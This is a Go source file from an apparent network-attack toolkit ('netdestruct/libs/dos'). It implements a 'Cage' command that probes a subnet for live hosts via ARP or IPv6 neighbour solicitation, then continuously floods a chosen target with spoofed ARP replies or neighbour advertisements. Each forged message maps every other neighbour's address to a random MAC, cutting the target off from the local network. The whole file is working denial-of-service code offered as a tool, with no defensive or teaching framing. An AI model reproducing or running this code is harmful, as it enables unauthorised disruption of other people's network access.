package arp

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"time"

	"netdestruct/libs/dos/routing"
)

const (
	arpTag         = "\x1b[38;5;208m[ARP]\x1b[0m"
	probeTimeout   = 100 * time.Millisecond
	cageInterval   = 250 * time.Millisecond
	maxIPv6Hosts   = 4096
)

// Cage discovers hosts on --subnet and poisons the --target ARP/NDP cache.
type Cage struct {
	Interface string
	Subnet    string
	Target    string
}

func (c *Cage) Run() error {
	iface, err := net.InterfaceByName(c.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", c.Interface, err)
	}
	_, ipNet, err := net.ParseCIDR(c.Subnet)
	if err != nil {
		return fmt.Errorf("invalid --subnet %q: %w", c.Subnet, err)
	}

	targets, err := targetHosts(c.Target)
	if err != nil {
		return err
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	srcMAC := iface.HardwareAddr
	if len(srcMAC) != 6 {
		return fmt.Errorf("interface %s has no MAC address", c.Interface)
	}

	ourIP4, ourIP6 := ifaceAddrs(iface, ipNet)
	if ipNet.IP.To4() != nil {
		if ourIP4 == nil {
			ourIP4 = net.IPv4zero
		}
		return c.runIPv4(sock, srcMAC, ourIP4, ipNet, targets)
	}
	if ourIP6 == nil {
		ourIP6 = net.IPv6zero
	}
	return c.runIPv6(sock, srcMAC, ourIP6, ipNet, targets)
}

func (c *Cage) runIPv4(sock rawSocket, srcMAC net.HardwareAddr, ourIP net.IP, ipNet *net.IPNet, targets []net.IP) error {
	neighbors, err := discoverIPv4(sock, srcMAC, ourIP, ipNet)
	if err != nil {
		return err
	}
	if len(neighbors) == 0 {
		return fmt.Errorf("no live hosts found on %s", c.Subnet)
	}

	var cageTargets []net.IP
	for _, t := range targets {
		if _, ok := neighbors[t.String()]; ok {
			cageTargets = append(cageTargets, t)
		}
	}
	if len(cageTargets) == 0 {
		return fmt.Errorf("target not found on subnet")
	}
	if len(neighbors) == 1 {
		return fmt.Errorf("no clients")
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped.\n", arpTag)
		os.Exit(0)
	}()

	for _, targetIP := range cageTargets {
		targetMAC := neighbors[targetIP.String()]
		fmt.Printf("%s Caging %s (%s) on %s\n", arpTag, targetIP, targetMAC, c.Interface)
	}
	fmt.Printf("%s Press Ctrl+C to stop.\n", arpTag)

	for {
		for _, targetIP := range cageTargets {
			targetMAC := neighbors[targetIP.String()]
			for ipStr, _ := range neighbors {
				if ipStr == targetIP.String() {
					continue
				}
				neighborIP := net.ParseIP(ipStr)
				spoofedMAC := randomMAC()
				frame := buildARPFrame(arpOpReply, targetMAC, spoofedMAC, neighborIP, targetMAC, targetIP)
				if err := sock.Send(frame); err != nil {
					return fmt.Errorf("send: %w", err)
				}
				fmt.Printf("\r%s %s <--> %s %s", arpTag, targetIP, neighborIP, spoofedMAC)
				time.Sleep(cageInterval)
			}
		}
	}
}

func (c *Cage) runIPv6(sock rawSocket, srcMAC net.HardwareAddr, ourIP net.IP, ipNet *net.IPNet, targets []net.IP) error {
	neighbors, err := discoverIPv6(sock, srcMAC, ourIP, ipNet)
	if err != nil {
		return err
	}
	if len(neighbors) == 0 {
		return fmt.Errorf("no live hosts found on %s", c.Subnet)
	}

	var cageTargets []net.IP
	for _, t := range targets {
		if _, ok := neighbors[t.String()]; ok {
			cageTargets = append(cageTargets, t)
		}
	}
	if len(cageTargets) == 0 {
		return fmt.Errorf("target not found on subnet")
	}
	if len(neighbors) == 1 {
		return fmt.Errorf("no clients")
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped.\n", arpTag)
		os.Exit(0)
	}()

	for _, targetIP := range cageTargets {
		targetMAC := neighbors[targetIP.String()]
		fmt.Printf("%s Caging %s (%s) on %s\n", arpTag, targetIP, targetMAC, c.Interface)
	}
	fmt.Printf("%s Press Ctrl+C to stop.\n", arpTag)

	for {
		for _, targetIP := range cageTargets {
			targetMAC := neighbors[targetIP.String()]
			for ipStr := range neighbors {
				if ipStr == targetIP.String() {
					continue
				}
				neighborIP := net.ParseIP(ipStr)
				spoofedMAC := randomMAC()
				frame := buildCageNA(spoofedMAC, targetMAC, neighborIP, targetIP)
				if err := sock.Send(frame); err != nil {
					return fmt.Errorf("send: %w", err)
				}
				fmt.Printf("\r%s %s <--> %s %s", arpTag, targetIP, neighborIP, spoofedMAC)
				time.Sleep(cageInterval)
			}
		}
	}
}

func discoverIPv4(sock rawSocket, srcMAC net.HardwareAddr, ourIP net.IP, ipNet *net.IPNet) (map[string]net.HardwareAddr, error) {
	neighbors := make(map[string]net.HardwareAddr)
	for _, ip := range allIPsInNet(ipNet) {
		fmt.Printf("\r%s Probing %s", arpTag, ip)
		if mac, ok := probeIPv4(sock, srcMAC, ourIP, ip); ok {
			neighbors[ip.String()] = mac
			fmt.Printf("\n%s %s %s\n", arpTag, ip, mac)
		}
	}
	fmt.Println()
	return neighbors, nil
}

func discoverIPv6(sock rawSocket, srcMAC net.HardwareAddr, ourIP net.IP, ipNet *net.IPNet) (map[string]net.HardwareAddr, error) {
	neighbors := make(map[string]net.HardwareAddr)
	for _, ip := range allIPsInNet(ipNet) {
		fmt.Printf("\r%s Probing %s", arpTag, ip)
		if mac, ok := probeIPv6(sock, srcMAC, ourIP, ip); ok {
			neighbors[ip.String()] = mac
			fmt.Printf("\n%s %s %s\n", arpTag, ip, mac)
		}
	}
	fmt.Println()
	return neighbors, nil
}

func probeIPv4(sock rawSocket, srcMAC net.HardwareAddr, ourIP, targetIP net.IP) (net.HardwareAddr, bool) {
	sock.SetReadTimeout(50 * time.Millisecond)
	if err := sock.Send(buildARPFrame(arpOpRequest, broadcastMAC, srcMAC, ourIP, zeroMAC, targetIP)); err != nil {
		return nil, false
	}
	buf := make([]byte, 1514)
	deadline := time.Now().Add(probeTimeout)
	for time.Now().Before(deadline) {
		n, err := sock.Recv(buf)
		if err != nil {
			continue
		}
		info, ok := parseARP(buf[:n])
		if ok && info.op == arpOpReply && info.senderIP.Equal(targetIP) {
			return info.senderMAC, true
		}
	}
	return nil, false
}

func probeIPv6(sock rawSocket, srcMAC net.HardwareAddr, ourIP, targetIP net.IP) (net.HardwareAddr, bool) {
	sock.SetReadTimeout(50 * time.Millisecond)
	if err := sock.Send(buildNS(srcMAC, ourIP, targetIP)); err != nil {
		return nil, false
	}
	buf := make([]byte, 1514)
	deadline := time.Now().Add(probeTimeout)
	for time.Now().Before(deadline) {
		n, err := sock.Recv(buf)
		if err != nil {
			continue
		}
		info, ok := parseNDP(buf[:n])
		if ok && info.icmpType == icmpv6NeighborAdvertisement && info.target.Equal(targetIP) {
			if info.linkAddr != nil {
				return info.linkAddr, true
			}
			return info.ethSrc, true
		}
	}
	return nil, false
}

func targetHosts(spec string) ([]net.IP, error) {
	routes, err := routing.ExpandTargets(spec)
	if err != nil {
		return nil, err
	}
	var out []net.IP
	for _, r := range routes {
		if v4 := r.Addr.To4(); v4 != nil {
			if r.PrefixLen >= 32 {
				out = append(out, v4)
			}
			continue
		}
		if r.PrefixLen >= 128 {
			out = append(out, r.Addr.To16())
		}
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("no target hosts resolved from %q", spec)
	}
	return out, nil
}

func allIPsInNet(ipNet *net.IPNet) []net.IP {
	if v4 := ipNet.IP.To4(); v4 != nil {
		ones, bits := ipNet.Mask.Size()
		if bits != 32 {
			return nil
		}
		hostBits := 32 - ones
		network := binary.BigEndian.Uint32(v4.Mask(ipNet.Mask))
		count := uint32(1) << uint(hostBits)
		out := make([]net.IP, 0, count)
		for i := uint32(0); i < count; i++ {
			b := make(net.IP, 4)
			binary.BigEndian.PutUint32(b, network+i)
			out = append(out, b)
		}
		return out
	}

	ones, bits := ipNet.Mask.Size()
	if bits != 128 || ones < 112 {
		return nil
	}
	network := ipNet.IP.Mask(ipNet.Mask).To16()
	hostBits := 128 - ones
	count := uint64(1) << uint(hostBits)
	if count > maxIPv6Hosts {
		count = maxIPv6Hosts
	}
	out := make([]net.IP, 0, count)
	for i := uint64(0); i < count; i++ {
		ip := append(net.IP{}, network...)
		addHostOffset(ip, ones, i)
		out = append(out, ip)
	}
	return out
}

func addHostOffset(ip net.IP, prefixLen int, offset uint64) {
	byteStart := prefixLen / 8
	if prefixLen%8 != 0 {
		byteStart++
	}
	for j := 15; j >= int(byteStart) && offset > 0; j-- {
		sum := uint64(ip[j]) + (offset & 0xff)
		ip[j] = byte(sum)
		offset = (offset >> 8) + (sum >> 8)
	}
}

func ifaceAddrs(iface *net.Interface, ipNet *net.IPNet) (net.IP, net.IP) {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, nil
	}
	var ip4, ip6 net.IP
	for _, a := range addrs {
		n, ok := a.(*net.IPNet)
		if !ok {
			continue
		}
		if v4 := n.IP.To4(); v4 != nil && ipNet.Contains(v4) {
			ip4 = v4
		}
		if n.IP.To4() == nil && n.IP.IsLinkLocalUnicast() {
			ip6 = n.IP
		}
	}
	return ip4, ip6
}

func randomMAC() net.HardwareAddr {
	mac := make(net.HardwareAddr, 6)
	_, _ = rand.Read(mac)
	mac[0] &^= 0x01
	return mac
}
